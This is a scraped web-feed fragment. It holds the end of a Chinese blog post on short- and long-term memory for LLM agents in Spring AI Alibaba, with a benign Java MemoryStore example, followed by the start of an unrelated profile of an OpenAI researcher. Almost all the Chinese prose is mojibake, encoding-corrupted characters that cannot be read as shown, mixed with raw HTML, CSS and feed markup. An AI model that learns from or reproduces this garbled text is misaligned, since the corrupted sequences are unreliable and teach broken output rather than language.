<p>å³ä½¿ä½ åœ¨ä½¿ç”¨çš„å¤§æ¨¡å‹ä¸Šä¸‹æ–‡é•¿åº¦è¶³å¤Ÿå¤§ï¼Œå¤§å¤šæ•°æ¨¡å‹åœ¨å¤„ç†è¾ƒé•¿ä¸Šä¸‹æ–‡æ—¶çš„è¡¨ç°ä»ç„¶å¾ˆå·®ã€‚å› ä¸ºå¾ˆå¤šæ¨¡å‹ä¼šè¢«è¿‡æ—¶æˆ–åç¦»ä¸»é¢˜çš„å†…å®¹"åˆ†æ•£æ³¨æ„åŠ›"ã€‚åŒæ—¶ï¼Œè¿‡é•¿çš„ä¸Šä¸‹æ–‡ï¼Œè¿˜ä¼šå¸¦æ¥å“åº”æ—¶é—´å˜é•¿ã€Token æˆæœ¬å¢åŠ ç­‰é—®é¢˜ã€‚</p>
<p>åœ¨ Spring AI ALibaba ä¸­ï¼ŒReactAgent ä½¿ç”¨Â messagesÂ è®°å½•å’Œä¼ é€’ä¸Šä¸‹æ–‡ï¼Œå…¶ä¸­åŒ…æ‹¬æŒ‡ä»¤ï¼ˆSystemMessageï¼‰å’Œè¾“å…¥ï¼ˆUserMessageï¼‰ã€‚åœ¨ ReactAgent ä¸­ï¼Œæ¶ˆæ¯ï¼ˆMessageï¼‰åœ¨ç”¨æˆ·è¾“å…¥å’Œæ¨¡å‹å“åº”ä¹‹é—´äº¤æ›¿ï¼Œå¯¼è‡´æ¶ˆæ¯åˆ—è¡¨éšç€æ—¶é—´çš„æ¨ç§»å˜å¾—è¶Šæ¥è¶Šé•¿ã€‚ç”±äºä¸Šä¸‹æ–‡çª—å£æœ‰é™ï¼Œè®¸å¤šåº”ç”¨ç¨‹åºå¯ä»¥ä»ä½¿ç”¨æŠ€æœ¯æ¥ç§»é™¤æˆ–"å¿˜è®°"è¿‡æ—¶ä¿¡æ¯ä¸­å—ç›Šï¼Œå³ â€œä¸Šä¸‹æ–‡å·¥ç¨‹â€ã€‚</p>
<p>ä½œä¸ºåç«¯ï¼Œæˆ‘ä»¬é€šå¸¸é‡‡å–ä»¥ä¸‹å‡ ç§ç­–ç•¥æ¥æ¨¡æ‹Ÿâ€œè®°å¿†â€ï¼š</p>
<ul>
<li><strong>Sliding Windowï¼ˆæ»‘åŠ¨çª—å£ï¼‰ï¼š</strong> åªä¿ç•™æœ€è¿‘çš„ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span></span> è½®å¯¹è¯ï¼Œä¸¢å¼ƒæœ€æ—©çš„è®°å½•ã€‚</li>
<li><strong>Summary Memoryï¼ˆæ‘˜è¦è®°å¿†ï¼‰ï¼š</strong> å½“å¯¹è¯è¿‡é•¿æ—¶ï¼Œè°ƒç”¨å¤§æ¨¡å‹å¯¹ä¹‹å‰çš„å¯¹è¯åšä¸€ä¸ªç®€çŸ­æ€»ç»“ï¼Œåç»­åªå¸¦ä¸Šè¿™ä¸ª <code>Summary</code>ã€‚</li>
<li><strong>Vector Databaseï¼ˆå‘é‡æ•°æ®åº“/RAGï¼‰ï¼š</strong> å°†å†å²å¯¹è¯å­˜å…¥å‘é‡åº“ï¼ˆå¦‚ Milvus, Pineconeï¼‰ã€‚å½“ç”¨æˆ·æé—®æ—¶ï¼Œé€šè¿‡è¯­ä¹‰æœç´¢æ£€ç´¢å‡ºæœ€ç›¸å…³çš„å†å²ç‰‡æ®µï¼ˆTop-Kï¼‰ï¼Œå¡è¿› Context ä¼ ç»™æ¨¡å‹ã€‚</li>
</ul>
<h3 data-id="heading-11">ç»´æŠ¤é•¿æœŸè®°å¿†</h3>
<h4 data-id="heading-12">é•¿æœŸè®°å¿†çš„æ£€ç´¢è¿‡ç¨‹</h4>
<p>å¯¹äºåç«¯å¼€å‘äººå‘˜æ¥è¯´ï¼Œé•¿æœŸè®°å¿†çš„æ£€ç´¢è¿‡ç¨‹å…¶å®å°±æ˜¯ä¸€ä¸ªæ ‡å‡†çš„ <strong>â€œè¯­ä¹‰æ£€ç´¢ + RAG (Retrieval-Augmented Generation)â€</strong> å·¥ä½œæµã€‚</p>
<p>ä½ å¯ä»¥æŠŠå®ƒç±»æ¯”ä¸ºï¼š<strong>å…¨æ–‡æœç´¢ï¼ˆElasticsearchï¼‰çš„å‡çº§ç‰ˆ</strong>ã€‚ä¸åŒäºå…³é”®è¯åŒ¹é…ï¼Œ<strong>å®ƒæ˜¯åŸºäºâ€œæ„æ€â€æ¥åŒ¹é…</strong>ã€‚</p>
<hr/>
<p>æ•´ä¸ªè¿‡ç¨‹å¯ä»¥åˆ†ä¸º <strong>â€œå­˜å…¥â€</strong> å’Œ <strong>â€œæ£€ç´¢â€</strong> ä¸¤ä¸ªé˜¶æ®µï¼š</p>
<h5 data-id="heading-13">1. å­˜å…¥é˜¶æ®µï¼ˆå†™å…¥/ç´¢å¼•ï¼‰</h5>
<p>å½“ä¸€æ®µå¯¹è¯ç»“æŸæˆ–äº§ç”Ÿæ–°çš„çŸ¥è¯†æ—¶ï¼š</p>
<ol>
<li><strong>åˆ‡ç‰‡ (Chunking)</strong> ï¼šå°†é•¿æ–‡æœ¬åˆ‡åˆ†æˆåˆé€‚çš„å¤§å°ï¼ˆä¾‹å¦‚ 512 tokensï¼‰ã€‚</li>
<li><strong>å‘é‡åŒ– (Embedding)</strong> ï¼šè°ƒç”¨ Embedding æ¨¡å‹ï¼ˆå¦‚ OpenAI çš„ <code>text-embedding-3-small</code>ï¼‰å°†æ–‡æœ¬è½¬ä¸ºé«˜ç»´å‘é‡ï¼ˆå¦‚ 1536 ç»´çš„æµ®ç‚¹æ•°æ•°ç»„ï¼‰ã€‚</li>
<li><strong>å…¥åº“</strong>ï¼šå°†å‘é‡å’ŒåŸå§‹æ–‡æœ¬ã€Metadataï¼ˆå¦‚ <code>user_id</code>, <code>timestamp</code>ï¼‰å­˜å…¥å‘é‡æ•°æ®åº“ï¼ˆRedis Vector Search, Milvus, æˆ– Pineconeï¼‰ã€‚</li>
</ol>
<h5 data-id="heading-14">2. æ£€ç´¢é˜¶æ®µï¼ˆè¯»å–/å¬å›ï¼‰</h5>
<p>å½“ç”¨æˆ·æå‡ºä¸€ä¸ªæ–°é—®é¢˜ï¼Œç³»ç»Ÿéœ€è¦â€œå›æƒ³èµ·â€ä»¥å‰çš„äº‹æƒ…ï¼š</p>
<ul>
<li>
<p>Step A: é—®é¢˜å‘é‡åŒ–</p>
<p>å°†ç”¨æˆ·çš„æé—®ï¼ˆQueryï¼‰åŒæ ·é€šè¿‡ Embedding æ¨¡å‹è½¬ä¸ºä¸€ä¸ªå‘é‡ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>V</mi><mrow><mi>q</mi><mi>u</mi><mi>e</mi><mi>r</mi><mi>y</mi></mrow></msub></mrow><annotation encoding="application/x-tex">V_{query}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">ery</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span>ã€‚</p>
</li>
<li>
<p>Step B: å‘é‡ç©ºé—´æœç´¢ (ANN Search)</p>
<p>åœ¨æ•°æ®åº“ä¸­å¯»æ‰¾ä¸ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>V</mi><mrow><mi>q</mi><mi>u</mi><mi>e</mi><mi>r</mi><mi>y</mi></mrow></msub></mrow><annotation encoding="application/x-tex">V_{query}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">ery</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span> è·ç¦»æœ€è¿‘ï¼ˆç›¸ä¼¼åº¦æœ€é«˜ï¼‰çš„ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi></mrow><annotation encoding="application/x-tex">K</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07153em;">K</span></span></span></span></span> ä¸ªå‘é‡ã€‚é€šå¸¸ä½¿ç”¨ä½™å¼¦ç›¸ä¼¼åº¦ (Cosine Similarity) è®¡ç®—ï¼š</p>
<p><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>similarity</mtext><mo>=</mo><mfrac><mrow><mi>A</mi><mo>â‹…</mo><mi>B</mi></mrow><mrow><mi mathvariant="normal">âˆ¥</mi><mi>A</mi><mi mathvariant="normal">âˆ¥</mi><mi mathvariant="normal">âˆ¥</mi><mi>B</mi><mi mathvariant="normal">âˆ¥</mi></mrow></mfrac></mrow><annotation encoding="application/x-tex">\text{similarity} = \frac{A \cdot B}{\|A\| \|B\|}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"/><span class="mord text"><span class="mord">similarity</span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.3923em;vertical-align:-0.52em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8723em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">âˆ¥</span><span class="mord mathnormal mtight">A</span><span class="mord mtight">âˆ¥âˆ¥</span><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span><span class="mord mtight">âˆ¥</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="mbin mtight">â‹…</span><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.52em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span></span></span></span></span></p>
</li>
<li>
<p>Step C: å¬å›ä¸è¿‡æ»¤</p>
<p>æ•°æ®åº“è¿”å›æœ€åŒ¹é…çš„åŸå§‹æ–‡æœ¬ç‰‡æ®µã€‚ä½œä¸ºåç«¯ï¼Œä½ é€šå¸¸ä¼šåœ¨è¿™é‡Œæ ¹æ® user_id åš Metadata Filterï¼Œç¡®ä¿ A ç”¨æˆ·çš„æé—®ä¸ä¼šæ£€ç´¢åˆ° B ç”¨æˆ·çš„è®°å¿†ã€‚</p>
</li>
<li>
<p>Step D: ä¸Šä¸‹æ–‡æ³¨å…¥ (Context Injection)</p>
<p>å°†æ£€ç´¢å‡ºæ¥çš„â€œè®°å¿†ç‰‡æ®µâ€æ‹¼æ¥åˆ°å½“å‰çš„ Prompt ä¸­ã€‚</p>
</li>
</ul>
<h4 data-id="heading-15">SAAçš„é•¿æœŸè®°å¿†å­˜å‚¨</h4>
<p>Spring AI Alibaba å°†é•¿æœŸè®°å¿†ä»¥ JSON æ–‡æ¡£çš„å½¢å¼å­˜å‚¨åœ¨ Store ä¸­ã€‚</p>
<p>æ¯ä¸ªè®°å¿†éƒ½åœ¨è‡ªå®šä¹‰çš„Â <code>namespace</code>ï¼ˆç±»ä¼¼äºæ–‡ä»¶å¤¹ï¼‰ä¸‹ç»„ç»‡ï¼Œå¹¶ä½¿ç”¨å”¯ä¸€çš„Â <code>key</code>ï¼ˆç±»ä¼¼äºæ–‡ä»¶åï¼‰ã€‚å‘½åç©ºé—´é€šå¸¸åŒ…å«ç”¨æˆ·æˆ–ç»„ç»‡ ID æˆ–å…¶ä»–æ ‡ç­¾ï¼Œä»¥ä¾¿æ›´å®¹æ˜“åœ°ç»„ç»‡ä¿¡æ¯ã€‚</p>
<p>è¿™ç§ç»“æ„æ”¯æŒè®°å¿†çš„å±‚æ¬¡åŒ–ç»„ç»‡ã€‚é€šè¿‡å†…å®¹è¿‡æ»¤å™¨æ”¯æŒè·¨å‘½åç©ºé—´æœç´¢ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> com.alibaba.cloud.ai.graph.store.stores.MemoryStore;
<span class="hljs-keyword">import</span> com.alibaba.cloud.ai.graph.store.StoreItem;

<span class="hljs-keyword">import</span> java.util.*;

<span class="hljs-comment">// MemoryStore å°†æ•°æ®ä¿å­˜åˆ°å†…å­˜å­—å…¸ä¸­ã€‚åœ¨ç”Ÿäº§ç¯å¢ƒä¸­è¯·ä½¿ç”¨åŸºäºæ•°æ®åº“çš„å­˜å‚¨å®ç°</span>
<span class="hljs-type">MemoryStore</span> <span class="hljs-variable">store</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MemoryStore</span>();

<span class="hljs-type">String</span> <span class="hljs-variable">userId</span> <span class="hljs-operator">=</span> <span class="hljs-string">"my-user"</span>;
<span class="hljs-type">String</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> <span class="hljs-string">"chitchat"</span>;
List&lt;String&gt; namespace = List.of(userId, applicationContext);

<span class="hljs-comment">// ä¿å­˜è®°å¿†</span>
Map&lt;String, Object&gt; memoryData = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
memoryData.put(<span class="hljs-string">"rules"</span>, List.of(
    <span class="hljs-string">"ç”¨æˆ·å–œæ¬¢ç®€çŸ­ç›´æ¥çš„è¯­è¨€"</span>,
    <span class="hljs-string">"ç”¨æˆ·åªè¯´ä¸­æ–‡å’ŒJava"</span>
));
memoryData.put(<span class="hljs-string">"my-key"</span>, <span class="hljs-string">"my-value"</span>);

<span class="hljs-type">StoreItem</span> <span class="hljs-variable">item</span> <span class="hljs-operator">=</span> StoreItem.of(namespace, <span class="hljs-string">"a-memory"</span>, memoryData);
store.putItem(item);

<span class="hljs-comment">// é€šè¿‡IDè·å–è®°å¿†</span>
Optional&lt;StoreItem&gt; retrievedItem = store.getItem(namespace, <span class="hljs-string">"a-memory"</span>);

<span class="hljs-comment">// åœ¨æ­¤å‘½åç©ºé—´å†…æœç´¢è®°å¿†ï¼Œé€šè¿‡å†…å®¹ç­‰ä»·æ€§è¿‡æ»¤ï¼ŒæŒ‰å‘é‡ç›¸ä¼¼åº¦æ’åº</span>
List&lt;StoreItem&gt; items = store.searchItems(
    namespace,
    Map.of(<span class="hljs-string">"my-key"</span>, <span class="hljs-string">"my-value"</span>)
);
</code></pre>
<h4 data-id="heading-16">SAAçš„é•¿æœŸè®°å¿†ç®¡ç†</h4>
<p>SAAè¿˜å¯ä»¥è¿›è¡Œå¯¹é•¿æœŸè®°å¿†çš„ç®¡ç†ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ ModelHook åœ¨æ¨¡å‹è°ƒç”¨å‰åè‡ªåŠ¨åŠ è½½å’Œä¿å­˜é•¿æœŸè®°å¿†ã€‚</p>
<p>åŒæ—¶ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥åœ¨toolé‡Œé¢è¿›è¡Œè¯»å–å’Œå†™å…¥é•¿æœŸè®°å¿†ã€‚</p>
<p>é•¿æœŸè®°å¿†çš„å†™å…¥å’Œå¬å›ç­‰æ ¸å¿ƒæµç¨‹å°±å¦‚ä¸Šé¢è¯´åˆ°çš„ä¸€æ ·ï¼Œè¿™é‡Œç”±äºç¯‡å¹…å°±ä¸è¯¦ç»†èµ˜è¿°ã€‚</p>
<h2 data-id="heading-17">æ€»ç»“</h2>
<p>æœ¬æ–‡è®¨è®ºäº†Memoryçš„æ¦‚å¿µï¼Œä¸¤ç§ä¸åŒè®°å¿†æœºåˆ¶çš„åŒºåˆ«ä»¥åŠSAAå¦‚ä½•å¤„ç†ä¸åŒè®°å¿†ã€‚</p>
<p>ä½†æ˜¯å¤§æ¨¡å‹åº”ç”¨å¼€å‘Memoryæ˜¯é—¨å­¦é—®ï¼Œä¹Ÿä¸å¯èƒ½ä¸€æ–‡èƒ½è®²æ¸…æ¥šæ‰€æœ‰åœºæ™¯è¯¥æ€ä¹ˆåšï¼Œæ¯”å¦‚çŸ­æœŸè®°å¿†å’Œé•¿æœŸè®°å¿†æ··åˆè¯¥æ€ä¹ˆä½¿ç”¨ï¼Œé‚£å°±ç­‰ç€è¯»è€…å»æ¢ç´¢äº†ã€‚</p>
<p>å¦‚æœä½ æ„Ÿè§‰è¿™ç¯‡å…¥é—¨æ–‡ç« ç»™ä½ å¸¦æ¥äº†ä¸é”™çš„ä½“æ„Ÿï¼Œé‚£å°±ç»™æˆ‘ç‚¹èµ+æ”¶è—+å…³æ³¨å§â¤ï¸</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç¿å®¶ç¿Œï¼šä»å¼€æºå°‘å¹´åˆ° OpenAI æ ¸å¿ƒç ”ç©¶å‘˜çš„é•¿æœŸä¸»ä¹‰ä¹‹è·¯]]></title>    <link>https://juejin.cn/post/7596955804260286514</link>    <guid>https://juejin.cn/post/7596955804260286514</guid>    <pubDate>2026-01-20T01:54:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596955804260286514" data-draft-id="7596955804260270130" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç¿å®¶ç¿Œï¼šä»å¼€æºå°‘å¹´åˆ° OpenAI æ ¸å¿ƒç ”ç©¶å‘˜çš„é•¿æœŸä¸»ä¹‰ä¹‹è·¯"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-01-20T01:54:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="akå•Š"/> <meta itemprop="url" content="https://juejin.cn/user/237916932030253"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç¿å®¶ç¿Œï¼šä»å¼€æºå°‘å¹´åˆ° OpenAI æ ¸å¿ƒç ”ç©¶å‘˜çš„é•¿æœŸä¸»ä¹‰ä¹‹è·¯
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/237916932030253/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    akå•Š
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T01:54:37.000Z" title="Tue Jan 20 2026 01:54:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ç¿å®¶ç¿Œï¼šä»å¼€æºå°‘å¹´åˆ° OpenAI æ ¸å¿ƒç ”ç©¶å‘˜çš„é•¿æœŸä¸»ä¹‰ä¹‹è·¯</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1df95116754c4cfc950748d2e8e7b851~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYWvllYo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769478877&amp;x-signature=Q%2FgR5Fh5rTPUW0RfSXD7UXWNwHI%3D" alt="image1.png" loading="lazy"/></p>
<p><em>æ¨¡å‹å¼€å‘ä¸‰é˜¶æ®µï¼šé¢„è®­ç»ƒâ€”åè®­ç»ƒâ€”RLHFï¼ˆç¤ºæ„ï¼‰</em></p>
<p>ä½œä¸º Tianshouï¼ˆå¤©æˆï¼‰å¼ºåŒ–å­¦ä¹ æ¡†æ¶çš„ä½œè€…å’Œ OpenAI GPT-4 åè®­ç»ƒï¼ˆPost-trainingï¼‰å›¢é˜Ÿçš„æ ¸å¿ƒæˆå‘˜ï¼Œç¿å®¶ç¿Œï¼ˆJiayi Wengï¼‰çš„æˆé•¿è·¯å¾„æœ¬èº«å°±æ˜¯ä¸€éƒ¨å…³äºâ€œå¦‚ä½•æ„å»ºå½±å“åŠ›â€çš„æ¡ˆä¾‹ã€‚åœ¨ WhynotTV çš„è¿™æœŸè®¿è°ˆä¸­ï¼Œä»–åˆ†äº«äº†ä»æ¸…åã€CMU åˆ° OpenAI çš„æŠ€æœ¯è¿›é˜¶ï¼Œå¹¶æ‹†è§£äº†å¼ºåŒ–å­¦ä¹ ã€å·¥ä¸šçº§åŸºç¡€è®¾æ–½ï¼ˆInfraï¼‰ä»¥åŠå¼€æºç¤¾åŒºèƒŒåçš„é€»è¾‘ã€‚è¿™æ—¢æ˜¯å¯¹å‰æ²¿æŠ€æœ¯çš„è§‚å¯Ÿï¼Œä¹Ÿæ˜¯ä¸€ä»½åœ¨ä¸ç¡®å®šæ€§ä¸­æŠ•èµ„æœªæ¥çš„è¡ŒåŠ¨å‚è€ƒã€‚</p>
<h3 data-id="heading-1">æ—©æœŸç»å†ï¼šæŠ•èµ„æœªæ¥ä¸æ‰“ç ´ä¿¡æ¯å·®</h3>
<p>ç¿å®¶ç¿Œçš„â€œé•¿æœŸä¸»ä¹‰â€åœ¨ç«¥å¹´æ—¶æœŸä¾¿å·²æ˜¾ç°ã€‚æ—©æœŸæ¥è§¦è®¡ç®—æœºæ—¶ï¼Œä»–æ›´å…³æ³¨èƒ½åœ¨æœªæ¥åå¤ä½¿ç”¨çš„èƒ½åŠ›æ„å»ºï¼›åœ¨é«˜ä¸­ä¿¡æ¯å­¦ç«èµ›é˜¶æ®µï¼Œä»–æ•é”ä½“ä¼šåˆ°â€œä¿¡æ¯å·®â€çš„å½±å“ï¼Œç†è§£é«˜è´¨é‡è®­ç»ƒèµ„æºçš„é‡è¦æ€§ã€‚</p>
